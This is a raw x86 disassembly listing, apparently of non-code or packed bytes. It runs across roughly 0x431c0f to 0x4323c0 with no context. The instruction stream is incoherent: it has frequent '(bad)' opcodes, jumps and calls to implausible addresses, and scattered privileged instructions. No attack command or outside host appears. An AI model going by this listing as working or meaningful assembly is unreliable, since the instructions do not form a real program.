  431c0f:	add    BYTE PTR [ecx],al
  431c11:	inc    DWORD PTR [ebp-0x75]
  431c14:	(bad)  
  431c15:	cld    
  431c16:	add    al,0xce
  431c18:	mov    ecx,edi
  431c1a:	cld    
  431c1b:	inc    ebp
  431c1c:	fidivr WORD PTR [ebx]
  431c1e:	fbstp  TBYTE PTR [ebp-0x3e]
  431c21:	mov    eax,DWORD PTR [eax]
  431c23:	adc    BYTE PTR [ebx-0x3974038b],cl
  431c29:	fadd   st,st(7)
  431c2b:	add    BYTE PTR [ebp-0x1],al
  431c2e:	mov    ecx,DWORD PTR [esp+edi*8]
  431c31:	inc    ebp
  431c32:	mov    bh,0xc7
  431c35:	loopne 0x431c7c
  431c37:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c3d:	sbb    al,0x33
  431c3f:	pushf  
  431c40:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c46:	mov    eax,edi
  431c48:	cwde   
  431c49:	inc    ebp
  431c4a:	inc    ebp
  431c4b:	jne    0x431bd8
  431c4d:	mov    esp,esp
  431c4f:	clc    
  431c50:	add    al,0x4d
  431c52:	mov    DWORD PTR [ebx],esi
  431c54:	or     al,0x33
  431c56:	inc    ebp
  431c57:	lea    ecx,[ebx-0x398d13fd]
  431c5d:	add    bh,al
  431c5f:	inc    ebp
  431c60:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c67:	add    ebp,esp
  431c69:	shufps xmm1,xmm3,0xc7
  431c6d:	(bad)  
  431c6e:	jmp    0x74885797
  431c73:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c79:	hlt    
  431c7a:	mov    ecx,DWORD PTR [edi]
  431c7c:	fadd   DWORD PTR [ebp+0x0]
  431c7f:	xor    ecx,DWORD PTR [edi]
  431c81:	add    ecx,ecx
  431c83:	cmp    edi,edi
  431c85:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c89:	(bad)  
  431c8a:	jmp    0x431c17
  431c8c:	mov    edi,esp
  431c8e:	or     al,0xc6
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	mov    eax,DWORD PTR [ebp+0x10]
  431c95:	jne    0x431c20
  431c97:	mov    eax,DWORD PTR [ecx]
  431c99:	clc    
  431c9a:	add    BYTE PTR [ebp-0x40],cl
  431c9d:	xor    edx,DWORD PTR [eax-0x73]
  431ca0:	jne    0x431ca3
  431ca2:	push   DWORD PTR [edx+0x8]
  431ca5:	add    BYTE PTR [ebp+0x45],al
  431ca8:	mov    ebp,ecx
  431caa:	cld    
  431cab:	add    BYTE PTR [ebp+0x0],cl
  431cae:	xor    eax,DWORD PTR [ebp+0x3]
  431cb1:	lea    edi,[ebx]
  431cb3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431cb9:	sub    eax,0x5d330e4d
  431cbe:	lea    esi,[ebx]
  431cc0:	add    DWORD PTR [ebx],eax
  431cc2:	jb     0x431cad
  431cc4:	add    BYTE PTR [eax],al
  431cc6:	inc    ebp
  431cc7:	add    bl,ch
  431cc9:	inc    ebp
  431cca:	mov    esi,DWORD PTR [ebx]
  431ccc:	or     al,0x3
  431cce:	(bad)  
  431ccf:	mov    edi,eax
  431cd1:	in     al,dx
  431cd2:	scas   eax,DWORD PTR es:[edi]
  431cd3:	inc    ebp
  431cd4:	mov    esi,DWORD PTR [ebx]
  431cd6:	in     al,0x3
  431cd8:	add    al,0x89
  431cda:	mov    ecx,DWORD PTR [eax+edi*8]
  431cdd:	dec    ebp
  431cde:	(bad)  
  431cdf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431ce6:	mov    ecx,eax
  431ce8:	cld    
  431ce9:	push   es
  431cea:	dec    ebp
  431ceb:	add    al,0x33
  431ced:	mov    DWORD PTR [ebx],eax
  431cef:	in     al,dx
  431cf0:	cmp    DWORD PTR [ebp-0x67],eax
  431cf3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cf9:	mov    edx,DWORD PTR [ebp-0x4]
  431cfc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cff:	xor    eax,DWORD PTR [ebp+0x3]
  431d02:	cmp    DWORD PTR [ebx],0x8b327499
  431d08:	xor    edi,esp
  431d0a:	jmp    0xff771a5c
  431d0f:	add    ecx,DWORD PTR [ebp-0x3f]
  431d12:	xor    ebx,DWORD PTR [edi]
  431d14:	add    eax,ecx
  431d16:	cmp    ebx,DWORD PTR [eax]
  431d18:	mov    ecx,DWORD PTR [ebp-0x4]
  431d1b:	mov    ecx,DWORD PTR [eax]
  431d1d:	adc    BYTE PTR [ebp-0x80],al
  431d20:	jmp    0x431d23
  431d22:	mov    eax,DWORD PTR [eax]
  431d24:	cld    
  431d25:	mov    bh,0xc6
  431d27:	push   ecx
  431d28:	(bad)  
  431d29:	jne    0x431d89
  431d2b:	dec    ecx
  431d2d:	or     BYTE PTR [ecx+ebx*1],cl
  431d30:	push   ebp
  431d31:	inc    ebp
  431d32:	in     al,dx
  431d33:	add    ebp,esp
  431d35:	or     bh,al
  431d37:	dec    ebp
  431d38:	cld    
  431d39:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d3f:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431d43:	dec    DWORD PTR [ebx+0x45510cf4]
  431d49:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431d4f:	mov    edx,DWORD PTR [ecx+0xc]
  431d52:	xor    eax,esi
  431d54:	mov    edx,0xc172c7
  431d59:	inc    ebp
  431d5a:	mov    esi,DWORD PTR [ebp+0x8]
  431d5d:	mov    eax,edx
  431d5f:	call   0x84c7e454
  431d64:	add    DWORD PTR [edx-0x76bace00],ebx
  431d6a:	mov    ebp,eax
  431d6c:	or     BYTE PTR [eax],dl
  431d6e:	jo     0x431dbd
  431d70:	push   edi
  431d71:	xor    esi,DWORD PTR [ebp+0x3]
  431d74:	(bad)  
  431d75:	pmulhuw mm0,mm1
  431d78:	test   DWORD PTR [ebp-0x8],ecx
  431d7b:	mov    DWORD PTR [ebp-0x67],eax
  431d7e:	mov    eax,DWORD PTR [ebp-0x4]
  431d81:	xor    edi,DWORD PTR [ebp-0x73]
  431d84:	xor    eax,DWORD PTR [ebx]
  431d86:	xor    esi,DWORD PTR [edx+0x3]
  431d89:	add    BYTE PTR [ecx],bh
  431d8b:	inc    ebp
  431d8c:	(bad)  
  431d8d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d93:	mov    DWORD PTR [eax],0x750f0004
  431d99:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d9f:	lock add BYTE PTR [ebp+0x0],cl
  431da3:	mov    esi,DWORD PTR [ebp-0x18]
  431da6:	mov    ebp,edx
  431da8:	or     al,0x72
  431daa:	ja     0x431dac
  431dac:	mov    edx,esi
  431dae:	cld    
  431daf:	(bad)  
  431db2:	cli    
  431db3:	mov    esi,DWORD PTR [ebp-0x4]
  431db6:	cmp    ecx,esi
  431db8:	bswap  edi
  431dba:	(bad)
  431dbe:	mov    esi,DWORD PTR [ebp-0x4]
  431dc1:	mov    esi,ecx
  431dc3:	clc    
  431dc4:	repnz add esi,DWORD PTR [ebp+0x45]
  431dc8:	push   ebx
  431dc9:	xor    eax,DWORD PTR [ebp+0x3]
  431dcc:	cmp    bl,BYTE PTR [edi-0x64]
  431dcf:	pop    ebx
  431dd0:	jmp    0x431e97
  431dd5:	mov    esi,DWORD PTR [ebp-0x7d]
  431dd8:	xor    ebp,DWORD PTR [eax]
  431dda:	lea    eax,[ebp-0x8]
  431ddd:	xor    eax,0xc7ef9cf2
  431de2:	neg    eax
  431de4:	ins    DWORD PTR es:[edi],dx
  431de5:	test   esi,edi
  431de7:	clc    
  431de8:	pop    esp
  431de9:	inc    ebp
  431dea:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431df0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431df6:	add    cl,al
  431df8:	jne    0x431d94
  431dfa:	mov    esi,DWORD PTR [edx]
  431dfc:	in     al,dx
  431dfd:	push   esi
  431dfe:	xor    BYTE PTR [ebp-0xe],dh
  431e01:	add    edi,esi
  431e03:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e09:	add    cl,bh
  431e0b:	mov    edi,DWORD PTR [ebp+0x8]
  431e0e:	mov    DWORD PTR [ebp-0x14],esi
  431e11:	add    esi,DWORD PTR [ebp+0x3c]
  431e14:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e1a:	mov    ah,0x38
  431e1c:	call   0xe0e4:0x898b329c
  431e23:	jne    0x431e9a
  431e25:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431e2b:	shl    edx,0xf2
  431e2e:	(bad)  
  431e2f:	mov    ah,0x16
  431e31:	dec    eax
  431e32:	jne    0x431dc7
  431e34:	mov    ecx,DWORD PTR [edi]
  431e36:	in     al,dx
  431e37:	jmp    0x431e2a
  431e39:	add    dl,dh
  431e3b:	mov    edi,esi
  431e3d:	or     al,0x8
  431e3f:	inc    ebp
  431e40:	jne    0x431e45
  431e42:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e48:	ret    
  431e49:	or     bh,bh
  431e4b:	jge    0x431e35
  431e4d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e53:	xor    edi,eax
  431e55:	add    esi,DWORD PTR [ebp-0x77]
  431e58:	mov    ebx,esp
  431e5a:	clc    
  431e5b:	neg    DWORD PTR [ebp-0x7c]
  431e5e:	xor    eax,DWORD PTR [eax]
  431e60:	cmp    eax,DWORD PTR [eax]
  431e62:	repz jne 0x431dfa
  431e65:	xor    eax,DWORD PTR [ecx]
  431e67:	add    ebx,DWORD PTR [eax]
  431e69:	mov    DWORD PTR [ebp-0x8],eax
  431e6c:	mov    eax,edi
  431e6e:	cld    
  431e6f:	lock pop eax
  431e71:	test   DWORD PTR [ebx],esi
  431e73:	clc    
  431e74:	add    edx,DWORD PTR [edi-0x740bff77]
  431e7a:	fdivp  st(4),st
  431e7c:	test   ecx,esi
  431e7e:	(bad)  
  431e7f:	jnp    0x431e80
  431e81:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e87:	jae    0x431e14
  431e89:	sub    edi,esp
  431e8b:	(bad)  
  431e8c:	shl    DWORD PTR [eax-0x3e],0x89
  431e90:	leave  
  431e91:	call   0x8198d59e
  431e96:	in     al,dx
  431e97:	(bad)  
  431e98:	in     al,dx
  431e99:	add    bh,al
  431e9b:	mov    esp,edi
  431e9d:	in     al,dx
  431e9e:	test   DWORD PTR [ebp-0x8],edi
  431ea1:	mov    eax,DWORD PTR [ebp+0x2b]
  431ea4:	xor    al,0x3
  431ea6:	pushf  
  431ea7:	jnp    0x57321ae0
  431ead:	xor    edx,DWORD PTR [ebx-0x77]
  431eb0:	push   ecx
  431eb1:	loopne 0x431ee6
  431eb3:	jne    0x431e70
  431eb5:	mov    esi,DWORD PTR [edx-0x20]
  431eb8:	add    BYTE PTR [ebp-0x3d],bh
  431ebb:	xor    eax,DWORD PTR [ebp-0x73]
  431ebe:	mov    edi,DWORD PTR [esi]
  431ec0:	cld    
  431ec1:	jb     0x431e89
  431ec3:	add    bl,al
  431ec5:	jne    0x431f0c
  431ec7:	mov    edx,DWORD PTR [edi-0x10]
  431eca:	jge    0x431f49
  431ecc:	mov    esi,DWORD PTR [ebx]
  431ece:	lock add ecx,DWORD PTR [ebp+0x3b]
  431ed2:	xor    esi,DWORD PTR [ebp-0x77]
  431ed5:	mov    esi,eax
  431ed7:	lock inc ebp
  431ed9:	jge    0x431f10
  431edb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431ee2:	dec    ebp
  431ee3:	mov    esi,DWORD PTR [ebx]
  431ee5:	loopne 0x431e70
  431ee7:	jge    0x431ee1
  431ee9:	add    DWORD PTR [ebp-0x7d],eax
  431eec:	cmc    
  431eed:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431ef4:	dec    ebp
  431ef5:	hlt    
  431ef6:	xor    ebx,DWORD PTR [ebp-0x77]
  431ef9:	mov    esi,esp
  431efb:	in     al,0x45
  431efd:	jge    0x431f38
  431eff:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f06:	dec    ebp
  431f07:	dec    esp
  431f08:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f0e:	inc    ebp
  431f0f:	hlt    
  431f10:	xor    eax,0xb88b9f75
  431f15:	add    al,0x95
  431f17:	icebp  
  431f18:	add    dl,dh
  431f1a:	mov    DWORD PTR [ebp+0x20],ebx
  431f1d:	cmp    eax,DWORD PTR [ebp+0xf]
  431f20:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431f24:	fistp  WORD PTR [ebx+0x0]
  431f27:	inc    ebp
  431f28:	mov    ebx,DWORD PTR [edi+0xc]
  431f2b:	add    eax,eax
  431f2d:	inc    ebp
  431f2e:	test   BYTE PTR [ebx],dh
  431f30:	add    eax,DWORD PTR [ebx]
  431f32:	add    BYTE PTR [esi+0x45],bl
  431f35:	ret    0x85
  431f38:	jnp    0x5443a307
  431f3e:	inc    bp
  431f40:	inc    ebp
  431f41:	xor    eax,0xc78a9cb9
  431f46:	add    ah,bl
  431f48:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431f4e:	add    BYTE PTR [ebx+0x3],dl
  431f51:	mov    esi,0x708088b
  431f56:	cmp    esi,eax
  431f58:	setp   BYTE PTR [ecx-0x74fcffce]
  431f5f:	mov    esp,edi
  431f61:	call   0x33ce64b3
  431f66:	or     BYTE PTR [ebx],al
  431f68:	inc    ecx
  431f69:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f6f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f75:	lock add cl,al
  431f78:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f7f:	mov    ch,0x45
  431f81:	clc    
  431f82:	xor    eax,DWORD PTR [ebp+0x3]
  431f85:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f8b:	inc    ebp
  431f8c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f92:	mov    edi,eax
  431f94:	mov    eax,DWORD PTR [ebp+0x3c]
  431f97:	mov    ecx,DWORD PTR [eax]
  431f99:	hlt    
  431f9a:	inc    ebp
  431f9b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431fa2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431fa8:	push   ebp
  431fa9:	mov    edi,DWORD PTR [ebx]
  431fab:	in     al,dx
  431fac:	jne    0x431f6f
  431fae:	mov    eax,DWORD PTR [ebp-0x28]
  431fb1:	add    DWORD PTR [eax],0xe8058dec
  431fb7:	clc    
  431fb8:	mov    esi,DWORD PTR [edi-0x8]
  431fbb:	add    dh,dl
  431fbd:	rol    WORD PTR [ebp-0x1],cl
  431fc1:	mov    edx,DWORD PTR [eax+0x8]
  431fc4:	jne    0x431f86
  431fc6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431fcd:	inc    ebp
  431fce:	push   esp
  431fcf:	test   DWORD PTR [ecx+0xf],ecx
  431fd2:	sub    edx,esp
  431fd4:	add    eax,DWORD PTR [eax]
  431fd6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431fdc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431fe3:	mov    eax,DWORD PTR [ecx]
  431fe5:	and    BYTE PTR [eax],al
  431fe7:	cmp    dl,BYTE PTR [eax]
  431fe9:	add    BYTE PTR [ebp+0x66],al
  431fec:	inc    ecx
  431fee:	push   esp
  431fef:	add    BYTE PTR [ebp+0x0],dh
  431ff2:	push   edx
  431ff3:	enterw 0xc1,0x4d
  431ff8:	mov    esp,DWORD PTR [esi+0x20]
  431ffb:	add    DWORD PTR [ecx-0x7b],eax
  431ffe:	add    eax,DWORD PTR [ebx]
  432000:	str    WORD PTR [eax+0x45]
  432004:	lea    ecx,[ebx+0x45890801]
  43200a:	sbb    BYTE PTR [ebx],al
  43200c:	dec    ebp
  43200d:	cmp    al,0xf
  43200f:	inc    ebp
  432010:	push   eax
  432011:	mov    esi,DWORD PTR [ebx]
  432013:	push   eax
  432014:	add    eax,eax
  432016:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43201d:	inc    ebp
  43201e:	add    BYTE PTR ds:0x8b4d8c00,dh
  432024:	xor    edx,esp
  432026:	add    eax,esi
  432028:	mov    ebx,eax
  43202a:	loopne 0x432071
  43202c:	dec    ebp
  43202d:	mov    ecx,DWORD PTR [edi]
  43202f:	cld    
  432030:	push   eax
  432031:	xchg   DWORD PTR [ebx],esi
  432033:	add    DWORD PTR [ebx],ebp
  432035:	add    BYTE PTR [ebx],ch
  432037:	or     BYTE PTR [ecx],bh
  432039:	dec    ecx
  43203a:	loopne 0x43203f
  43203c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432042:	push   ebp
  432043:	add    DWORD PTR [ebx+0x55100800],eax
  432049:	dec    ebp
  43204a:	jmp    0x431fd5
  43204c:	mov    esp,DWORD PTR [eax]
  43204e:	sbb    dl,dl
  432050:	inc    eax
  432051:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432057:	add    BYTE PTR [ebx+0x74528555],cl
  43205d:	push   ebp
  43205e:	div    DWORD PTR [ebx]
  432060:	and    eax,DWORD PTR [ebx]
  432062:	add    edx,DWORD PTR [edx-0x30]
  432065:	jno    0x431ff2
  432067:	inc    DWORD PTR [eax+eiz*1]
  43206a:	inc    ebp
  43206b:	push   eax
  43206c:	push   eax
  43206d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432073:	mov    edi,esp
  432075:	push   eax
  432076:	inc    ebp
  432077:	enter  0x458b,0x8
  43207b:	push   ecx
  43207c:	(bad)  
  43207d:	call   0x10d2a55
  432082:	pop    ss
  432083:	push   ebp
  432084:	mov    ecx,DWORD PTR [ebx+0x489408]
  43208a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432090:	push   ecx
  432091:	jo     0x43207b
  432093:	inc    DWORD PTR [edi]
  432095:	or     BYTE PTR [eax],al
  432097:	call   0xce27e1
  43209c:	fmul   QWORD PTR [ebp+0x55]
  43209f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4320a5:	mov    bh,0x8c
  4320a7:	adc    al,0x9a
  4320a9:	dec    esp
  4320aa:	xor    bl,BYTE PTR [eax]
  4320ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4320af:	mov    eax,DWORD PTR [ebp-0x4]
  4320b2:	mov    esi,DWORD PTR [edi-0x3148f924]
  4320b8:	push   es
  4320b9:	retf   
  4320ba:	mov    BYTE PTR [ebp-0x30],0x3b
  4320be:	inc    ebp
  4320bf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4320c6:	retf   0x83fc
  4320c9:	into   
  4320ca:	dec    ebp
  4320cb:	retf   
  4320cc:	mov    ecx,DWORD PTR [ebp-0x74]
  4320cf:	mov    eax,DWORD PTR [eax]
  4320d1:	fdiv   QWORD PTR [ebx]
  4320d3:	mov    bh,0x3
  4320d5:	push   es
  4320d6:	mov    esi,ecx
  4320d8:	sbb    cl,dl
  4320da:	dec    ebp
  4320db:	sar    DWORD PTR [ebx],cl
  4320dd:	push   ebp
  4320de:	jne    0x4320ef
  4320e0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320e6:	lea    ebx,[eax]
  4320e8:	call   0xf4ccacaf
  4320ed:	sbb    dh,dl
  4320ef:	add    edx,ebx
  4320f1:	push   ebp
  4320f2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320f8:	push   ecx
  4320f9:	mov    DWORD PTR [eax-0x30],edx
  4320fc:	test   DWORD PTR [edx],eax
  4320fe:	xadd   esp,esi
  432101:	pop    es
  432102:	add    cl,dl
  432104:	mov    eax,ecx
  432106:	or     al,0x45
  432108:	(bad)  
  432109:	push   eax
  43210a:	add    DWORD PTR [edx+0x0],eax
  43210d:	add    ecx,DWORD PTR [ecx]
  43210f:	and    dh,cl
  432111:	call   0xc729e1
  432116:	add    DWORD PTR [ebp+0x0],edx
  432119:	mov    esp,DWORD PTR [ebp+0x18]
  43211c:	add    BYTE PTR [eax+0x54],cl
  43211f:	xor    eax,DWORD PTR [eax]
  432121:	add    esp,DWORD PTR [esi+0x3b]
  432124:	inc    ebp
  432125:	je     0x4320aa
  432127:	push   ecx
  432128:	cli    
  432129:	dec    ebp
  43212a:	mov    DWORD PTR [ebx],eax
  43212c:	(bad)  
  43212d:	or     al,0x5e
  43212f:	inc    eax
  432130:	add    BYTE PTR [ebx],al
  432132:	data16 and BYTE PTR [ebp+0x50],al
  432136:	sub    DWORD PTR [ecx],0xfffffff8
  432139:	add    BYTE PTR [ebp-0x75],ah
  43213c:	add    BYTE PTR [eax],bl
  43213e:	enter  0x894d,0x8b
  432142:	int3   
  432143:	loopne 0x43217f
  432145:	rol    BYTE PTR [eax],0x33
  432148:	lea    cx,[ebp+0xa]
  43214c:	data16 jb 0x432194
  43214f:	add    BYTE PTR [ebx+0x44890855],cl
  432155:	sbb    ah,al
  432157:	inc    ebp
  432158:	cmp    cl,BYTE PTR [edi]
  43215a:	add    BYTE PTR [edx+0x66],dl
  43215d:	xor    ecx,DWORD PTR [eax]
  43215f:	sub    eax,DWORD PTR [eax]
  432161:	mov    eax,DWORD PTR [eax]
  432163:	or     al,0x66
  432165:	ror    edx,cl
  432167:	dec    ebp
  432168:	inc    ebp
  432169:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43216f:	cld    
  432170:	or     BYTE PTR [edi+0x4501dd],dl
  432176:	ror    dh,0xee
  432179:	retf   
  43217a:	(bad)  
  43217b:	dec    ebp
  43217c:	mov    al,0x8b
  43217e:	loop   0x4321a0
  432180:	cmp    ecx,DWORD PTR [edx]
  432182:	inc    ebp
  432183:	daa    
  432184:	loop   0x43210d
  432186:	out    dx,al
  432187:	add    edi,eax
  432189:	add    BYTE PTR [eax+0x3f52ed55],bh
  43218f:	push   ebp
  432190:	inc    ebp
  432191:	xor    ebx,eax
  432193:	add    ebp,esi
  432195:	push   edx
  432196:	push   bp
  432198:	inc    ebp
  432199:	(bad)  
  43219a:	jmp    0xc342e7f3
  43219f:	sbb    al,0x33
  4321a1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4321a8:	add    BYTE PTR [ebp+0x45],0x8b
  4321ac:	jmp    0xf98b:0x100041c8
  4321b3:	xor    esi,DWORD PTR [edx+0x3]
  4321b6:	mov    ecx,DWORD PTR [edi]
  4321b8:	fmul   DWORD PTR [edx]
  4321ba:	add    BYTE PTR [eax],al
  4321bc:	lea    eax,[ebx-0x4700273c]
  4321c2:	add    al,0x4f
  4321c4:	pop    DWORD PTR [eax]
  4321c6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4321cc:	push   edx
  4321cd:	inc    WORD PTR [ebp+0x8]
  4321d1:	mov    eax,0x514f4d
  4321d6:	(bad)
  4321da:	add    al,al
  4321dc:	xor    DWORD PTR [ebx-0x74baf730],eax
  4321e2:	test   DWORD PTR [esi+0x74],esp
  4321e5:	inc    ebp
  4321e6:	mov    DWORD PTR [eax+0xa4f08],edi
  4321ec:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321f2:	or     dh,cl
  4321f4:	or     eax,0x8b8d5045
  4321f9:	inc    ebp
  4321fa:	mov    WORD PTR [ecx+0x3b8a00],?
  432200:	jne    0x432235
  432202:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432208:	add    DWORD PTR [ebx],eax
  43220a:	add    bh,bh
  43220c:	adc    DWORD PTR [eax],ecx
  43220e:	adc    DWORD PTR [ebp+0x55],edi
  432211:	push   es
  432212:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432218:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43221f:	inc    ebp
  432220:	mov    esp,edi
  432222:	or     al,0xd8
  432224:	push   eax
  432225:	(bad)  
  432226:	jne    0x4321dc
  432228:	call   0x3b1b15
  43222d:	inc    ebp
  43222e:	sar    BYTE PTR [edx],0x84
  432231:	out    dx,al
  432232:	add    bh,al
  432234:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  43223b:	(bad)  
  43223c:	and    al,al
  43223e:	fs jmp 0x7cc86843
  432244:	bswap  ecx
  432246:	scas   al,BYTE PTR es:[edi]
  432247:	inc    esp
  432248:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43224f:	or     BYTE PTR [ebx-0x97717c7],0x83
  432256:	call   DWORD PTR [edi]
  432258:	shr    ah,0x84
  43225b:	xchg   DWORD PTR [eax],eax
  43225d:	add    DWORD PTR [eax],eax
  43225f:	add    bh,bh
  432261:	dec    ebp
  432262:	and    BYTE PTR [ecx-0x38],dl
  432265:	push   eax
  432266:	dec    DWORD PTR [ebx+0xfd885]
  43226c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432272:	mov    WORD PTR [ecx+0x0],ss
  432275:	lea    ecx,[ebx+0x108b20d8]
  43227b:	mov    WORD PTR [edx],ds
  43227d:	add    BYTE PTR [edi+0xff01ff],al
  432283:	mov    ecx,DWORD PTR [ebp-0x28]
  432286:	push   ecx
  432287:	shl    BYTE PTR [ebp+0x3a],0x8b
  43228b:	inc    ebp
  43228c:	in     al,0xeb
  43228e:	jno    0x43221b
  432290:	push   edx
  432291:	mov    DWORD PTR [eax-0x28],edx
  432294:	mov    eax,DWORD PTR [ebp+0x20]
  432297:	je     0x432220
  432299:	mov    eax,DWORD PTR [ecx]
  43229b:	sbb    BYTE PTR [eax],al
  43229d:	pop    DWORD PTR [eax]
  43229f:	add    esi,eax
  4322a1:	add    bl,al
  4322a3:	adc    DWORD PTR [edi],esi
  4322a5:	jmp    0x8bce72f7
  4322aa:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4322b1:	jne    0x43223e
  4322b3:	mov    ecx,DWORD PTR [eax]
  4322b5:	in     al,0x75
  4322b7:	pop    DWORD PTR [ecx+0x5301]
  4322bd:	push   edx
  4322be:	inc    DWORD PTR [ebx]
  4322c0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4322c6:	add    BYTE PTR [edi+0x9],dl
  4322c9:	call   DWORD PTR [esi]
  4322cb:	and    dl,al
  4322cd:	and    bh,bh
  4322cf:	inc    edi
  4322d1:	test   eax,edx
  4322d3:	sldt   ebx
  4322d6:	xor    al,0x0
  4322d8:	pushf  
  4322d9:	(bad)  
  4322da:	jmp    0x4322e8
  4322dc:	mov    eax,edi
  4322de:	or     al,0x75
  4322e0:	inc    eax
  4322e1:	call   0x4319e9
  4322e6:	mov    eax,eax
  4322e8:	loopne 0x43226e
  4322ea:	inc    ebp
  4322eb:	add    BYTE PTR [ebx+0x1451c00],cl
  4322f1:	mov    eax,DWORD PTR [ebp+0x20]
  4322f4:	add    edi,ecx
  4322f6:	add    BYTE PTR [eax],ch
  4322f8:	cmp    edi,0x18
  4322fb:	test   DWORD PTR [ebp+0xf],esi
  4322fe:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432305:	jne    0x432309
  432307:	call   0xffa21dcc
  43230c:	leave  
  43230d:	rcr    BYTE PTR [esp+eax*4],0x55
  432311:	add    ah,ch
  432313:	add    BYTE PTR [edi-0x48fef979],dh
  432319:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432320:	inc    esp
  432321:	mov    ebx,DWORD PTR [eax]
  432323:	fcom   st(2)
  432325:	add    BYTE PTR [edi],bl
  432327:	lea    ecx,[eax-0x18]
  43232a:	(bad)  
  43232b:	push   DWORD PTR [ecx]
  43232d:	call   0xffb5708f
  432332:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432336:	fstp   DWORD PTR [esi+ebx*8]
  432339:	push   ebp
  43233a:	pop    ebp
  43233b:	mov    esi,DWORD PTR [edx-0x38]
  43233e:	add    DWORD PTR [eax],0x28
  432341:	mov    edi,DWORD PTR [ebx]
  432343:	xor    esi,DWORD PTR [edx+0x3]
  432346:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43234a:	pop    ebp
  43234b:	or     al,0x4
  43234d:	inc    ecx
  43234e:	push   ebp
  43234f:	(bad)  
  432350:	in     al,dx
  432351:	or     ah,ch
  432353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432354:	xbegin 0xffc8994a
  43235a:	clc    
  43235b:	adc    al,0x45
  43235d:	div    BYTE PTR [eax+ecx*1]
  432360:	pushf  
  432361:	add    bh,al
  432363:	jne    0x43233d
  432365:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  43236f:	add    eax,DWORD PTR [ebp+0x52]
  432372:	adc    eax,0x20
  432375:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  43237b:	test   DWORD PTR [eax],eax
  43237d:	clc    
  43237e:	data16 or al,BYTE PTR [ebp+0x45]
  432382:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432389:	rol    BYTE PTR [ebp+0x45],1
  43238c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432392:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432398:	push   ebx
  432399:	add    BYTE PTR [ebx+0x0],dl
  43239c:	push   ecx
  43239d:	jge    0x4323d2
  43239f:	add    BYTE PTR [esi+0x4],dl
  4323a2:	jne    0x432409
  4323a4:	mov    edx,0x457200
  4323a9:	jmp    0x43236d
  4323ab:	xor    edi,DWORD PTR [ebx]
  4323ad:	pop    edi
  4323ae:	cvtdq2ps xmm7,xmm0
  4323b1:	ret    0x0
  4323b4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4323ba:	xor    ecx,DWORD PTR [edi]
  4323bc:	add    eax,DWORD PTR [ecx+0x3b]
  4323bf:	push   ebx
  4323c0:	rdpmc  
